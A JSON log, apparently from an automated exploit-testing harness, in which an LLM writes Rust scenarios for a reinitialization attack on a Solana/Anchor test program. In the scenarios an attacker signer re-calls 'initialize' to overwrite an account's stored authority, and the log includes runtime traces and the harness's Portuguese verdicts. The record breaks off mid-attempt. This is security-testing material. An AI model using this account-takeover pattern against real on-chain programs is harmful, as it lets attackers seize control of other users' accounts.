@@ -1,0 +1,519 @@
+{
+  "category": "REINIT",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "Success",
+  "reason": "o ataque nao exercita a hipotese de REINIT: e preciso que a instrucao do ataque seja a mesma do baseline e uma conta com dados chegue ao ataque com estado diferente do que tinha no baseline (ex.: o estado ja inicializado em resultado.resulting_accounts). Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca.",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2286,
+        "completion_tokens": 917,
+        "latency_s": 5.55
+      },
+      "raw": "{\"plan\": \"O programa `initialize` recebe uma conta `user` como AccountInfo (sem constraint de init) e um `authority` signer. O codigo le a conta, exige que `discriminator` seja `true` (senao retorna erro) e entao sobrescreve `authority` com a chave do signer. Para montar o cenario, criamos uma conta `user` com dados ja serializados (discriminator=true, authority=chave_legitima) e chamamos `initialize` com um authority legitimo como baseline, que deve ter sucesso. Em seguida, o ataque chama `initialize` novamente sobre a mesma conta `user` (ja inicializada) com um authority atacante diferente, tentando sobrescrever o campo `authority`. O efeito medido e que o campo `authority` na conta `user` apos o ataque e igual a chave do atacante, diferente da chave legitima original, demonstrando a reinitializacao e tomada de controle.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Chaves\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\n// Conta user ja inicializada: discriminator=true, authority=legit_authority\\nlet user_data = anchor_account_data(\\\"User\\\", &(true, legit_authority));\\nlet user_account = account(&program_id, &user_data, None);\\n\\n// Contas para o baseline (uso legitimo)\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, wallet(1_000_000_000)),\\n];\\n\\n// Instrucao initialize: sem argumentos, metas: user (nao signer, writable), authority (signer)\\nlet ix_baseline = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(legit_authority, true),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Apos o baseline, a conta user deve ter authority=legit_authority\\n// Usamos o estado resultante para o ataque\\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\\n\\n// Ataque: mesma instrucao initialize, mas com attacker_authority como signer\\nlet contas_attack = vec![\\n    (user_key, user_after_baseline),\\n    (attacker_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(attacker_authority, true),\\n    ],\\n);\\n\\nlet r_attack = env.attack(\\\"reinitialize com authority atacante\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let user_data_after = after(&r_attack, &user_key).data();\\n    // Layout: discriminator (bool, 1 byte) + authority (Pubkey, 32 bytes)\\n    // authority comeca no offset 1\\n    let authority_after = read_pubkey(user_data_after, 1);\\n    env.effect(\\n        \\\"authority sobrescrita pelo atacante\\\",\\n        authority_after == attacker_authority,\\n    );\\n    env.effect(\\n        \\\"authority diferente da legitima\\\",\\n        authority_after != legit_authority,\\n    );\\n}\"}",
+      "plan": "O programa `initialize` recebe uma conta `user` como AccountInfo (sem constraint de init) e um `authority` signer. O codigo le a conta, exige que `discriminator` seja `true` (senao retorna erro) e entao sobrescreve `authority` com a chave do signer. Para montar o cenario, criamos uma conta `user` com dados ja serializados (discriminator=true, authority=chave_legitima) e chamamos `initialize` com um authority legitimo como baseline, que deve ter sucesso. Em seguida, o ataque chama `initialize` novamente sobre a mesma conta `user` (ja inicializada) com um authority atacante diferente, tentando sobrescrever o campo `authority`. O efeito medido e que o campo `authority` na conta `user` apos o ataque e igual a chave do atacante, diferente da chave legitima original, demonstrando a reinitializacao e tomada de controle.",
+      "scenario": "let program_id = env.program_id;\n\n// Chaves\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\n// Conta user ja inicializada: discriminator=true, authority=legit_authority\nlet user_data = anchor_account_data(\"User\", &(true, legit_authority));\nlet user_account = account(&program_id, &user_data, None);\n\n// Contas para o baseline (uso legitimo)\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, wallet(1_000_000_000)),\n];\n\n// Instrucao initialize: sem argumentos, metas: user (nao signer, writable), authority (signer)\nlet ix_baseline = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(legit_authority, true),\n    ],\n);\n\nlet r_baseline = env.baseline(\"initialize legitimo\", &ix_baseline, &contas_baseline);\n\n// Apos o baseline, a conta user deve ter authority=legit_authority\n// Usamos o estado resultante para o ataque\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\n\n// Ataque: mesma instrucao initialize, mas com attacker_authority como signer\nlet contas_attack = vec![\n    (user_key, user_after_baseline),\n    (attacker_authority, wallet(1_000_000_000)),\n];\n\nlet ix_attack = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(attacker_authority, true),\n    ],\n);\n\nlet r_attack = env.attack(\"reinitialize com authority atacante\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let user_data_after = after(&r_attack, &user_key).data();\n    // Layout: discriminator (bool, 1 byte) + authority (Pubkey, 32 bytes)\n    // authority comeca no offset 1\n    let authority_after = read_pubkey(user_data_after, 1);\n    env.effect(\n        \"authority sobrescrita pelo atacante\",\n        authority_after == attacker_authority,\n    );\n    env.effect(\n        \"authority diferente da legitima\",\n        authority_after != legit_authority,\n    );\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3752,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 41,
+                "head": "9f755fe3ef973aec",
+                "digest": "e1a39371c782e5e3",
+                "post": "9f755fe3ef973aec010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "reinitialize com authority atacante",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3752,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 41,
+                "head": "9f755fe3ef973aec",
+                "digest": "e1a39371c782e5e3",
+                "post": "9f755fe3ef973aec010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:25:17.571442067Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_04_sec/src/lib.rs:11:79:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidInput, error: \"Invalid bool representation: 159\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3752 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3752 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2976,
+        "completion_tokens": 742,
+        "latency_s": 3.71
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem o discriminador Anchor de 8 bytes que o programa espera ao desserializar com `User::try_from_slice`. O programa le os dados brutos da conta como `User` (bool + Pubkey), entao a conta deve conter exatamente 33 bytes: `true` seguido da authority legitima. O baseline chama `initialize` com a authority legitima e deve ter sucesso. O ataque repete `initialize` sobre a mesma conta ja inicializada, mas assinada pela authority do atacante, sobrescrevendo o campo authority. O efeito mede se a authority gravada na conta passou a ser a do atacante.\", \"scenario\": \"let program_id = env.program_id;\\n\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\n// Conta user ja inicializada: dados brutos = bool(true) + Pubkey(legit_authority)\\nlet mut user_data = Vec::new();\\nuser_data.push(1u8);\\nuser_data.extend_from_slice(legit_authority.as_ref());\\nlet user_account = account(&program_id, &user_data, None);\\n\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(legit_authority, true),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo\\\", &ix_baseline, &contas_baseline);\\n\\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\\n\\nlet contas_attack = vec![\\n    (user_key, user_after_baseline),\\n    (attacker_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(attacker_authority, true),\\n    ],\\n);\\n\\nlet r_attack = env.attack(\\\"reinitialize com authority atacante\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let user_data_after = after(&r_attack, &user_key).data();\\n    let authority_after = read_pubkey(user_data_after, 1);\\n    env.effect(\\n        \\\"authority sobrescrita pelo atacante\\\",\\n        authority_after == attacker_authority,\\n    );\\n    env.effect(\\n        \\\"authority diferente da legitima\\\",\\n        authority_after != legit_authority,\\n    );\\n}\\n\"}",
+      "plan": "O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem o discriminador Anchor de 8 bytes que o programa espera ao desserializar com `User::try_from_slice`. O programa le os dados brutos da conta como `User` (bool + Pubkey), entao a conta deve conter exatamente 33 bytes: `true` seguido da authority legitima. O baseline chama `initialize` com a authority legitima e deve ter sucesso. O ataque repete `initialize` sobre a mesma conta ja inicializada, mas assinada pela authority do atacante, sobrescrevendo o campo authority. O efeito mede se a authority gravada na conta passou a ser a do atacante.",
+      "scenario": "let program_id = env.program_id;\n\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\n// Conta user ja inicializada: dados brutos = bool(true) + Pubkey(legit_authority)\nlet mut user_data = Vec::new();\nuser_data.push(1u8);\nuser_data.extend_from_slice(legit_authority.as_ref());\nlet user_account = account(&program_id, &user_data, None);\n\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, wallet(1_000_000_000)),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(legit_authority, true),\n    ],\n);\n\nlet r_baseline = env.baseline(\"initialize legitimo\", &ix_baseline, &contas_baseline);\n\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\n\nlet contas_attack = vec![\n    (user_key, user_after_baseline),\n    (attacker_authority, wallet(1_000_000_000)),\n];\n\nlet ix_attack = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(attacker_authority, true),\n    ],\n);\n\nlet r_attack = env.attack(\"reinitialize com authority atacante\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let user_data_after = after(&r_attack, &user_key).data();\n    let authority_after = read_pubkey(user_data_after, 1);\n    env.effect(\n        \"authority sobrescrita pelo atacante\",\n        authority_after == attacker_authority,\n    );\n    env.effect(\n        \"authority diferente da legitima\",\n        authority_after != legit_authority,\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "reinitialize com authority atacante",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "authority sobrescrita pelo atacante",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "authority diferente da legitima",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de REINIT: e preciso que a instrucao do ataque seja a mesma do baseline e uma conta com dados chegue ao ataque com estado diferente do que tinha no baseline (ex.: o estado ja inicializado em resultado.resulting_accounts). Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2903,
+        "completion_tokens": 749,
+        "latency_s": 3.87
+      },
+      "raw": "{\"plan\": \"A conta `user` é um AccountInfo bruto (sem discriminador Anchor), então seus dados são apenas bool + Pubkey. O baseline chama `initialize` legitimamente com a authority legítima, o que grava `discriminator = true` e `authority = legit_authority`. O ataque chama a MESMA instrução `initialize` sobre a mesma conta `user` já inicializada (estado vindo de `resulting_accounts` do baseline), mas passando a authority do atacante como signer, sobrescrevendo o campo `authority`. O efeito medido é que a authority armazenada passa a ser a do atacante, diferente da gravada no baseline.\", \"scenario\": \"let program_id = env.program_id;\\n\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\n// Conta user ja inicializada: dados brutos = bool(true) + Pubkey(legit_authority)\\nlet mut user_data = Vec::new();\\nuser_data.push(1u8);\\nuser_data.extend_from_slice(legit_authority.as_ref());\\nlet user_account = account(&program_id, &user_data, None);\\n\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(legit_authority, true),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Estado da conta user apos o baseline (ja inicializada)\\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\\n\\nlet contas_attack = vec![\\n    (user_key, user_after_baseline),\\n    (attacker_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(attacker_authority, true),\\n    ],\\n);\\n\\nlet r_attack = env.attack(\\\"reinitialize com authority atacante\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let user_data_after = after(&r_attack, &user_key).data();\\n    let authority_after = read_pubkey(user_data_after, 1);\\n    env.effect(\\n        \\\"authority sobrescrita pelo atacante\\\",\\n        authority_after == attacker_authority,\\n    );\\n    env.effect(\\n        \\\"authority diferente da legitima\\\",\\n        authority_after != legit_authority,\\n    );\\n}\\n\"}",
+      "plan": "A conta `user` é um AccountInfo bruto (sem discriminador Anchor), então seus dados são apenas bool + Pubkey. O baseline chama `initialize` legitimamente com a authority legítima, o que grava `discriminator = true` e `authority = legit_authority`. O ataque chama a MESMA instrução `initialize` sobre a mesma conta `user` já inicializada (estado vindo de `resulting_accounts` do baseline), mas passando a authority do atacante como signer, sobrescrevendo o campo `authority`. O efeito medido é que a authority armazenada passa a ser a do atacante, diferente da gravada no baseline.",
+      "scenario": "let program_id = env.program_id;\n\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\n// Conta user ja inicializada: dados brutos = bool(true) + Pubkey(legit_authority)\nlet mut user_data = Vec::new();\nuser_data.push(1u8);\nuser_data.extend_from_slice(legit_authority.as_ref());\nlet user_account = account(&program_id, &user_data, None);\n\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, wallet(1_000_000_000)),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(legit_authority, true),\n    ],\n);\n\nlet r_baseline = env.baseline(\"initialize legitimo\", &ix_baseline, &contas_baseline);\n\n// Estado da conta user apos o baseline (ja inicializada)\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\n\nlet contas_attack = vec![\n    (user_key, user_after_baseline),\n    (attacker_authority, wallet(1_000_000_000)),\n];\n\nlet ix_attack = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(attacker_authority, true),\n    ],\n);\n\nlet r_attack = env.attack(\"reinitialize com authority atacante\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let user_data_after = after(&r_attack, &user_key).data();\n    let authority_after = read_pubkey(user_data_after, 1);\n    env.effect(\n        \"authority sobrescrita pelo atacante\",\n        authority_after == attacker_authority,\n    );\n    env.effect(\n        \"authority diferente da legitima\",\n        authority_after != legit_authority,\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "reinitialize com authority atacante",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "authority sobrescrita pelo atacante",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "authority diferente da legitima",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de REINIT: e preciso que a instrucao do ataque seja a mesma do baseline e uma conta com dados chegue ao ataque com estado diferente do que tinha no baseline (ex.: o estado ja inicializado em resultado.resulting_accounts). Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2917,
+        "completion_tokens": 743,
+        "latency_s": 3.78
+      },
+      "raw": "{\"plan\": \"O baseline chama `initialize` sobre uma conta `user` cujos dados brutos sao bool(true) + Pubkey(legit_authority), o que faz a instrucao ter sucesso e gravar authority=legit_authority. O ataque reutiliza a mesma instrucao `initialize` e a mesma conta `user`, mas agora com os dados resultantes do baseline (ja inicializada) e passando a authority do atacante como signer. Se a instrucao nao verificar o estado anterior, ela sobrescreve authority com a chave do atacante; o efeito mede se a authority final e a do atacante e diferente da legitima.\", \"scenario\": \"let program_id = env.program_id;\\n\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\n// Conta user com dados brutos: bool(true) + Pubkey(legit_authority)\\nlet mut user_data = Vec::new();\\nuser_data.push(1u8);\\nuser_data.extend_from_slice(legit_authority.as_ref());\\nlet user_account = account(&program_id, &user_data, None);\\n\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(legit_authority, true),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Estado da conta user apos o baseline (ja inicializada)\\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\\n\\nlet contas_attack = vec![\\n    (user_key, user_after_baseline),\\n    (attacker_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(attacker_authority, true),\\n    ],\\n);\\n\\nlet r_attack = env.attack(\\\"reinitialize com authority atacante\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let user_data_after = after(&r_attack, &user_key).data();\\n    let authority_after = read_pubkey(user_data_after, 1);\\n    env.effect(\\n        \\\"authority sobrescrita pelo atacante\\\",\\n        authority_after == attacker_authority,\\n    );\\n    env.effect(\\n        \\\"authority diferente da legitima\\\",\\n        authority_after != legit_authority,\\n    );\\n}\\n\"}",
+      "plan": "O baseline chama `initialize` sobre uma conta `user` cujos dados brutos sao bool(true) + Pubkey(legit_authority), o que faz a instrucao ter sucesso e gravar authority=legit_authority. O ataque reutiliza a mesma instrucao `initialize` e a mesma conta `user`, mas agora com os dados resultantes do baseline (ja inicializada) e passando a authority do atacante como signer. Se a instrucao nao verificar o estado anterior, ela sobrescreve authority com a chave do atacante; o efeito mede se a authority final e a do atacante e diferente da legitima.",
+      "scenario": "let program_id = env.program_id;\n\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\n// Conta user com dados brutos: bool(true) + Pubkey(legit_authority)\nlet mut user_data = Vec::new();\nuser_data.push(1u8);\nuser_data.extend_from_slice(legit_authority.as_ref());\nlet user_account = account(&program_id, &user_data, None);\n\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, wallet(1_000_000_000)),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(legit_authority, true),\n    ],\n);\n\nlet r_baseline = env.baseline(\"initialize legitimo\", &ix_baseline, &contas_baseline);\n\n// Estado da conta user apos o baseline (ja inicializada)\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\n\nlet contas_attack = vec![\n    (user_key, user_after_baseline),\n    (attacker_authority, wallet(1_000_000_000)),\n];\n\nlet ix_attack = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(attacker_authority, true),\n    ],\n);\n\nlet r_attack = env.attack(\"reinitialize com authority atacante\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let user_data_after = after(&r_attack, &user_key).data();\n    let authority_after = read_pubkey(user_data_after, 1);\n    env.effect(\n        \"authority sobrescrita pelo atacante\",\n        authority_after == attacker_authority,\n    );\n    env.effect(\n        \"authority diferente da legitima\",\n        authority_after != legit_authority,\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
